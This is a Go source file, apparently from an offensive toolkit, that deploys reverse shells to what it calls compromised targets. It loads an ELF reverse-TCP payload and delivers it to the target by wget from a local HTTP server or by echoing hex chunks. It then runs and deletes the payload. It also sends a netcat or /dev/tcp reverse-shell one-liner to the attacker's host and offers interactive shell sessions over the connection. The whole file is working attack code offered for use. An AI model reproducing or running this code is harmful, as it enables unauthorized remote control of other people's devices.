package shell

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"

	"github.com/cookiengineer/goaccess/payload"
)

// Handler manages the deployment of reverse and bind shells to compromised targets.
type Handler struct {
	Architecture string                        // "arm", "mipsle", etc.
	Method       string                        // "wget", "echo", "cmd"
	Location     string                        // "/tmp" — writable directory on target
	PayloadData  []byte                        // ELF binary payload
	LHOST        string                        // attacker's IP for reverse shells
	LPORT        int                           // attacker's listening port
	executeFunc  func(string) (string, error)  // callback to execute commands on the target
}

// NewHandler creates a shell handler for the given architecture and deployment method.
func NewHandler(arch, method, location string) (*Handler, error) {
	archType := payload.Arch(arch)
	payloadData, err := payload.GetPayload(archType, payload.ReverseTCP)
	if err != nil {
		return nil, fmt.Errorf("shell: cannot load payload for arch %s: %w", arch, err)
	}

	return &Handler{
		Architecture: arch,
		Method:       method,
		Location:     location,
		PayloadData:  payloadData,
	}, nil
}

// SetExecuteFunc sets the function used to run commands on the compromised target.
func (handler *Handler) SetExecuteFunc(executeFn func(string) (string, error)) {
	handler.executeFunc = executeFn
}

// DeployReverse deploys a reverse TCP shell payload to the target.
// It starts a listener, transfers the payload, executes it, and returns the connection.
func (handler *Handler) DeployReverse() (net.Conn, error) {
	if handler.executeFunc == nil {
		return nil, fmt.Errorf("shell: execute function not set")
	}
	if handler.LHOST == "" || handler.LPORT == 0 {
		return nil, fmt.Errorf("shell: LHOST and LPORT must be set for reverse shell")
	}

	// Start TCP listener
	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", handler.LPORT))
	if err != nil {
		return nil, fmt.Errorf("shell: cannot start listener: %w", err)
	}

	// Transfer and execute payload
	binaryName := randomName(8)
	binaryPath := handler.Location + "/" + binaryName

	switch handler.Method {
	case "wget":
		if err := handler.transferWget(binaryPath, listener); err != nil {
			listener.Close()
			return nil, err
		}
	case "echo":
		if err := handler.transferEcho(binaryPath); err != nil {
			listener.Close()
			return nil, err
		}
	case "cmd":
		// cmd method: no binary transfer; exploit's Execute() runs commands directly.
		// The caller must call ExecuteViaCmd() explicitly per command.
		// Return interact-ready: start a shell on the target via netcat or similar.
		command := fmt.Sprintf("(nc %s %d -e /bin/sh 2>/dev/null || bash -i >& /dev/tcp/%s/%d 0>&1) &",
			handler.LHOST, handler.LPORT, handler.LHOST, handler.LPORT)
		go func() {
			handler.executeFunc(command)
		}()

		// Wait for incoming reverse connection
		listener.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
		connection, err := listener.Accept()
		listener.Close()
		if err != nil {
			return nil, fmt.Errorf("shell: no reverse connection received: %w", err)
		}
		return connection, nil
	}

	// Execute the payload (wget/echo methods)
	execCommand := fmt.Sprintf("chmod +x %s && %s; rm -f %s", binaryPath, binaryPath, binaryPath)
	go func() {
		handler.executeFunc(execCommand)
	}()

	// Wait for incoming reverse connection
	listener.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
	connection, err := listener.Accept()
	listener.Close()
	if err != nil {
		return nil, fmt.Errorf("shell: no reverse connection received: %w", err)
	}

	return connection, nil
}

// Interact provides an interactive shell over the given connection.
func (handler *Handler) Interact(connection net.Conn) {
	defer connection.Close()

	go func() {
		io.Copy(connection, os.Stdin)
	}()

	io.Copy(os.Stdout, connection)
}

func (handler *Handler) transferWget(binaryPath string, listener net.Listener) error {
	// Start HTTP server to serve the payload
	httpListener, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return fmt.Errorf("shell: cannot start HTTP server: %w", err)
	}

	httpPort := httpListener.Addr().(*net.TCPAddr).Port

	go func() {
		connection, err := httpListener.Accept()
		if err != nil {
			return
		}
		defer connection.Close()

		connection.Write([]byte("HTTP/1.0 200 OK\r\n"))
		connection.Write([]byte("Content-Type: application/octet-stream\r\n"))
		connection.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(handler.PayloadData))))
		connection.Write([]byte("\r\n"))
		connection.Write(handler.PayloadData)
	}()

	downloadCommand := fmt.Sprintf("wget http://%s:%d/payload -qO %s", handler.LHOST, httpPort, binaryPath)
	handler.executeFunc(downloadCommand)

	httpListener.Close()
	return nil
}

func (handler *Handler) transferEcho(binaryPath string) error {
	// Chunk the binary into hex and transfer via echo commands
	chunkSize := 60
	payload := handler.PayloadData

	for position := 0; position < len(payload); position += chunkSize {
		end := position + chunkSize
		if end > len(payload) {
			end = len(payload)
		}
		chunk := payload[position:end]

		// Build hex string
		hexString := ""
		for _, byteValue := range chunk {
			hexString += fmt.Sprintf("\\x%02x", byteValue)
		}

		echoCommand := fmt.Sprintf("echo -ne '%s' >> %s", hexString, binaryPath)
		handler.executeFunc(echoCommand)
	}

	return nil
}

func randomName(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for index := range result {
		result[index] = charset[index%len(charset)]
	}
	return string(result)
}

// ExecuteViaCmd runs an external command (e.g., from a cmd-method exploit) on the target.
// This is used when the exploit has its own Execute() method and doesn't need binary payload transfer.
func ExecuteViaCmd(executeFn func(string) (string, error), command string) (string, error) {
	if executeFn == nil {
		return "", fmt.Errorf("shell: execute function not set")
	}
	return executeFn(command)
}

// StartReverseListener starts a listener for reverse shell connections.
func StartReverseListener(port int) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return nil, fmt.Errorf("shell: cannot start reverse listener: %w", err)
	}
	return listener, nil
}

// RunReverseListener accepts connections as they arrive and provides interactive sessions.
func RunReverseListener(listener net.Listener, timeout time.Duration) error {
	for {
		listener.(*net.TCPListener).SetDeadline(time.Now().Add(timeout))
		connection, err := listener.Accept()
		if err != nil {
			return err
		}

		go func(conn net.Conn) {
			defer conn.Close()
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Run()
		}(connection)
	}
}
